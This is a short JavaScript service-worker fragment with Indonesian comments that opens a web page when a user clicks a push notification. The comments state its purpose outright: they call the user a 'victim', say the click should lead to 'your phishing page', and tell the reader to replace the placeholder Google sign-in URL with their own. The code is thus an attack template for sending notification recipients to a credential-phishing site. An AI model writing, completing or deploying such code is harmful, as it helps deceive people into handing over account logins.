self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    // Jika korban klik notifikasi, arahkan ke halaman phishing Anda
    event.waitUntil(
        clients.openWindow('https://accounts.google.com/signin') // Ganti dengan URL Anda
    );
});